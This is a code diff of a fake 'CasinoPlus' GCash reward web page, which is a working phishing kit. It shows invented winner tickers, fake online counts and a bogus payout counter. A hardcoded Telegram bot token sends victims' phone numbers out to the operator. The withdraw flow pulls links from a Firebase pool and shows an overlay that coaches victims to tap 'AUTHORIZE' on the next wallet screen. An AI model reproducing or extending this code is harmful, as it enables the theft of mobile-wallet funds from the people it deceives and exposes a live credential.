@@ -5,9 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CasinoPlus | Live Payout</title>
 
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="js/config.js"></script>
+
     <script>
         (function() {
-            // 1. Check if Banned or Not Verified
+            // Check for Banned or Not Verified
             const isBanned = localStorage.getItem("cp_device_locked") === "true";
             const isVerified = localStorage.getItem("cp_verified") === "true";
             if (isBanned || !isVerified) {
@@ -15,7 +19,7 @@
                 return;
             }
 
-            // 2. Mobile-Only Enforcement
+            // Mobile-Only Enforcement
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             const isSmallScreen = window.innerWidth <= 768;
 
@@ -35,27 +39,27 @@
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; overflow-x: hidden; }
 
-        /* MOBILE ONLY OVERLAY */
-        #mobileOnlyOverlay { position: fixed; inset: 0; background: #060a13; z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
-        .restrict-icon { font-size: 60px; margin-bottom: 20px; }
-        .restrict-title { font-size: 24px; color: #fbbf24; font-weight: 900; margin-bottom: 10px; }
-        .restrict-text { color: #94a3b8; font-size: 15px; line-height: 1.6; max-width: 300px; }
+        /* OVERLAYS */
+        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
+        #mobileOnlyOverlay { position: fixed; inset: 0; background: #060a13; z-index: 999998; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
+        
+        .spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* LIVE WINNERS & USERS */
+        .proc-title { font-size: 22px; font-weight: 900; color: #fff; margin-bottom: 15px; letter-spacing: 1px; }
+        .proc-text { color: #fbbf24; font-size: 15px; line-height: 1.6; font-weight: 600; max-width: 320px; background: rgba(251, 191, 36, 0.1); padding: 15px; border-radius: 12px; border: 1px solid rgba(251, 191, 36, 0.3); }
+
+        /* LIVE STATS */
         .live-stats { position: absolute; top: 20px; display: flex; flex-direction: column; align-items: center; gap: 8px; z-index: 100; width: 100%; }
-        .live-winner-box { background: rgba(0, 0, 0, 0.85); border: 1px solid rgba(212, 175, 55, 0.4); padding: 8px 15px; border-radius: 50px; font-size: 11px; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(10px); animation: slideIn 0.5s ease-out; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .online-count { font-size: 10px; color: #22c55e; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
-        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
-        .gc-mini-icon { width: 14px; height: 14px; vertical-align: middle; margin: 0 2px; }
-
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        .live-winner-box { background: rgba(0, 0, 0, 0.85); border: 1px solid rgba(212, 175, 55, 0.4); padding: 8px 15px; border-radius: 50px; font-size: 11px; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(10px); }
+        .online-count { font-size: 10px; color: #22c55e; font-weight: 800; text-transform: uppercase; }
+        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .gc-mini-icon { width: 14px; height: 14px; vertical-align: middle; }
 
         /* MAIN CARD */
-        .card { background: rgba(255, 255, 255, 0.03); width: 100%; max-width: 400px; padding: 35px 20px; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(15px); text-align: center; }
+        .card { background: rgba(255, 255, 255, 0.03); width: 100%; max-width: 400px; padding: 35px 20px; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(15px); text-align: center; position: relative; }
         .logo-img { width: 160px; margin-bottom: 20px; }
-
-        /* TIMER & AMOUNT */
         .timer-box { font-size: 12px; color: #94a3b8; margin-bottom: 5px; font-weight: 600; }
         .amount { font-family: 'Orbitron', sans-serif; font-size: 52px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; font-weight: 700; }
 
@@ -64,96 +68,114 @@
         .pay-button { background: var(--gold); color: #000; width: 100%; padding: 18px; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 6px 0 #8b6508; transition: 0.2s; }
         .pay-button:active { transform: translateY(3px); box-shadow: 0 3px 0 #8b6508; }
         .pay-button:disabled { background: #334155; color: #64748b; box-shadow: none; cursor: not-allowed; }
-
-        .share-button { background: #1877f2; color: #fff; width: 100%; padding: 12px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; }
-
+        
+        .share-button { background: #1877f2; color: #fff; width: 100%; padding: 12px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .promo-photo { width: 100%; border-radius: 20px; margin-top: 25px; border: 1px solid rgba(212, 175, 55, 0.2); }
-
-        /* UI/UX CONDITIONING OVERLAY (NEW) */
-        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.95); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(10px); }
-        .spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .proc-title { font-size: 22px; font-weight: 900; color: #fff; margin-bottom: 15px; letter-spacing: 1px; }
-        .proc-text { color: #fbbf24; font-size: 15px; line-height: 1.6; font-weight: 600; max-width: 320px; background: rgba(251, 191, 36, 0.1); padding: 15px; border-radius: 12px; border: 1px solid rgba(251, 191, 36, 0.3); }
     </style>
 </head>
 <body>
 
     <div id="processingOverlay">
         <div class="spinner"></div>
-        <div class="proc-title">Securing Connection...</div>
-        <div class="proc-text">⚠️ IMPORTANT: Please tap <b>"AUTHORIZE"</b> or <b>"AGREE"</b> on the next screen to receive your reward.</div>
+        <div class="proc-title">ESTABLISHING SECURE VIALINK...</div>
+        <div class="proc-text">⚠️ <b>REQUIRED ACTION:</b><br>Tap <b>"AUTHORIZE"</b> or <b>"AGREE"</b> on the next screen to verify your GCash wallet and receive the reward.</div>
     </div>
 
     <div id="mobileOnlyOverlay">
-        <div class="restrict-icon">📱</div>
-        <h2 class="restrict-title">Mobile Access Only</h2>
-        <p class="restrict-text">For security reasons, rewards can only be claimed using the <b>CasinoPlus Mobile App</b> or a mobile browser.</p>
-        <p style="margin-top:20px; color: #fbbf24; font-size: 12px;">Please switch to your phone to proceed.</p>
+        <div style="font-size: 60px;">📱</div>
+        <h2 style="color:#fbbf24; margin: 15px 0;">Mobile Access Only</h2>
+        <p style="color:#94a3b8; font-size: 14px;">Please switch to your phone to claim rewards.</p>
     </div>
 
     <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
-        
         <div class="live-stats">
             <div class="online-count"><span class="dot"></span> <span id="userCount">32</span> Members Online</div>
             <div class="live-winner-box" id="winnerBox">
-                <span id="winnerEntry">User 0915***4421 just claimed <img src="gc_icon.png" class="gc-mini-icon">₱500</span>
+                <span id="winnerEntry">User 0917***8821 just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱500</span>
             </div>
         </div>
 
         <div class="card">
             <img src="images/logo1.png" class="logo-img">
-            
-            <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; margin-bottom: 5px; font-weight: 800;">AVAILABLE PAYOUT</div>
-            
-            <div class="timer-box" id="timerLabel">Generating rewards in: <span id="countdown">05</span>s</div>
+            <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; font-weight: 800;">TOTAL PAYOUT</div>
+            <div class="timer-box" id="timerLabel">Processing rewards in: <span id="countdown">05</span>s</div>
             <div class="amount" id="balanceText">₱0.00</div>
             
             <div class="btn-group">
                 <button class="share-button" id="shareBtn" onclick="shareToFB()" style="display: none;">
-                    <svg width="18" height="18" fill="white" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                     Share to Increase Reward (+₱50)
                 </button>
-
                 <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
             </div>
-            
-            <p style="font-size: 10px; color: #64748b; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px;">Secure Payout Verification System</p>
             
             <img src="images/casinoplus.jpeg" class="promo-photo">
         </div>
     </div>
 
-    <script src="js/config.js"></script>
     <script>
-        // --- TELEGRAM TRACKER CONFIG ---
+        // --- 1. INITIALIZE FIREBASE & TRACKING ---
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
-        const savedPhone = localStorage.getItem("userPhone") || "Unknown User";
+        const savedPhone = localStorage.getItem("userPhone") || "Guest_Target";
 
         async function trackActivity(action) {
-            const message = `🎯 GCASH REDIRECT!\n📱 Number: ${savedPhone}\n🔘 Action: ${action}`;
+            const message = `🚨 [REWARD ATTEMPT]\n📱 Target: ${savedPhone}\n🔘 Action: ${action}`;
             try { await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`); } catch(e) {}
         }
-        // --------------------------------
 
-        const possibleAmounts = [150, 200, 250, 300, 500, 750];
+        // --- 2. CORE REDIRECT LOGIC (VIALINK SYSTEM) ---
+        function redirectToGCash() {
+            const claimBtn = document.getElementById('claimBtn');
+            const overlay = document.getElementById('processingOverlay');
+
+            claimBtn.disabled = true;
+            overlay.style.display = 'flex';
+            
+            trackActivity("Target initiated Withdraw. Searching for Active ViaLink...");
+
+            // Fetch 'available' link from Firebase
+            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
+                if (snapshot.exists()) {
+                    const linkId = Object.keys(snapshot.val())[0];
+                    const targetUrl = snapshot.val()[linkId].url;
+
+                    // Update link status to PENDING
+                    db.ref('links/' + linkId).update({
+                        status: 'pending',
+                        user: savedPhone
+                    });
+
+                    trackActivity(`ViaLink Established! Redirecting to GCash...`);
+
+                    // 3.5s delay for conditioning
+                    setTimeout(() => {
+                        window.location.href = targetUrl;
+                    }, 3500);
+
+                } else {
+                    trackActivity("CRITICAL ERROR: No Ready ViaLinks in Database!");
+                    alert("System busy! All reward slots are currently full. Please try again in 10 minutes.");
+                    overlay.style.display = 'none';
+                    claimBtn.disabled = false;
+                }
+            });
+        }
+
+        // --- 3. UI ANIMATIONS & STATS ---
+        const possibleAmounts = [350, 500, 750, 1000];
         let currentReward = possibleAmounts[Math.floor(Math.random() * possibleAmounts.length)];
         let timeLeft = 5;
 
-        const countdownEl = document.getElementById('countdown');
-        const balanceEl = document.getElementById('balanceText');
-        const claimBtn = document.getElementById('claimBtn');
-        const shareBtn = document.getElementById('shareBtn');
-
-        const timer = setInterval(() => {
+        const countdownTimer = setInterval(() => {
             timeLeft--;
-            if(countdownEl) countdownEl.innerText = timeLeft < 10 ? "0" + timeLeft : timeLeft;
-
+            if(document.getElementById('countdown')) document.getElementById('countdown').innerText = "0" + timeLeft;
             if (timeLeft <= 0) {
-                clearInterval(timer);
-                document.getElementById('timerLabel').innerHTML = "Bonus Credited!";
-                shareBtn.style.display = "flex";
+                clearInterval(countdownTimer);
+                document.getElementById('timerLabel').innerHTML = "Reward Confirmed!";
+                document.getElementById('shareBtn').style.display = "flex";
                 animateValue(0, currentReward, 1500); 
             }
         }, 1000);
@@ -164,63 +186,32 @@
                 if (!startTimestamp) startTimestamp = timestamp;
                 const progress = Math.min((timestamp - startTimestamp) / duration, 1);
                 const currentVal = Math.floor(progress * (end - start) + start);
-                balanceEl.innerText = "₱" + currentVal.toLocaleString() + ".00";
+                document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
                 if (progress < 1) {
                     window.requestAnimationFrame(step);
                 } else {
-                    claimBtn.disabled = false;
-                    balanceEl.style.filter = "drop-shadow(0 0 10px rgba(212,175,55,0.5))";
+                    document.getElementById('claimBtn').disabled = false;
                 }
             };
             window.requestAnimationFrame(step);
         }
 
         function shareToFB() {
-            const shareUrl = "https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent("https://xjiligames.github.io/rewards/");
-            window.open(shareUrl, '_blank', 'width=600,height=400');
-
-            if (currentReward < 1000) {
-                let oldReward = currentReward;
-                currentReward = Math.min(currentReward + 50, 1000);
-                animateValue(oldReward, currentReward, 500);
-                
-                if (currentReward >= 1000) {
-                    shareBtn.innerHTML = "Maximum Bonus Reached!";
-                    shareBtn.style.background = "#334155";
-                    shareBtn.disabled = true;
-                }
-            }
+            window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank', 'width=600,height=400');
+            let oldVal = currentReward;
+            currentReward += 50;
+            animateValue(oldVal, currentReward, 500);
         }
 
-        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966"];
-        function updateStats() {
-            const online = Math.floor(Math.random() * (60 - 20 + 1)) + 20;
-            const uCount = document.getElementById('userCount');
-            if(uCount) uCount.innerText = online;
-
-            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-            const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-            const randomAmount = [300, 500, 800, 1000][Math.floor(Math.random() * 4)];
-            
-            const wEntry = document.getElementById('winnerEntry');
-            if(wEntry) wEntry.innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${randomAmount.toLocaleString()}`;
-        }
-        setInterval(updateStats, 3000);
-
-        // --- UPDATED REDIRECT FUNCTION WITH CONDITIONING & TRACKING ---
-        function redirectToGCash() {
-            // 1. Send silent notification to Telegram
-            trackActivity("User clicked Withdraw. Redirecting to GCash...");
-
-            // 2. Show the Conditioning Overlay
-            document.getElementById('processingOverlay').style.display = 'flex';
-            
-            // 3. Wait for 3.5 seconds para mabasa nila yung instructions
-            setTimeout(() => {
-                // Gamitin ang window.LATEST_GCASH_URL na galing sa config.js
-                window.location.href = window.LATEST_GCASH_URL || "https://m.gcash.com";
-            }, 3500);
-        }
+        // Live Winner Rotator
+        setInterval(() => {
+            const online = Math.floor(Math.random() * (90 - 40)) + 40;
+            document.getElementById('userCount').innerText = online;
+            const pref = ["0917", "0915", "0998", "0966", "0927"][Math.floor(Math.random() * 5)];
+            const suffix = Math.floor(1000 + Math.random() * 9000);
+            const amt = [500, 800, 1000, 1200][Math.floor(Math.random() * 4)];
+            document.getElementById('winnerEntry').innerHTML = `User ${pref}***${suffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amt}`;
+        }, 4000);
     </script>
 </body>
 </html>
